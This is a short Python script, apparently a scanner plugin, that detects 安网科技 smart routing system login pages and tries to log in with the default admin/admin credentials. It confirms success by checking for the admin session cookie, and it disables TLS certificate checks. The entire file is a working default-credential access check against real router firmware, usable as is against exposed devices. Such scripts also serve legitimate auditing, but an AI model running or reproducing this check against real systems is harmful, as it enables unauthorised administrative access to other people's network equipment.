import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"login.html"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	response.encoding='utf-8'
	if response.status_code == 200 and "<title>安网科技-智能路由系统</title>" in response.text:
		uc1=True
	else:
		uc1=False
	url=baseurl+"login.cgi"
	body="user=admin&password=admin"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "ac_userid=admin,ac_passwd=" in response.headers["Set-Cookie"] and "window.open('index.htm?_" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			uc2=True
		else:
			uc2=False
	else:
		if response.status_code == 200 and "ac_userid=admin,ac_passwd=" in response.headers["Set-Cookie"] and "window.open('index.htm?_" in response.text:
			uc2=True
		else:
			uc2=False
	if uc1 and uc2:
		return True
	else:
		return False
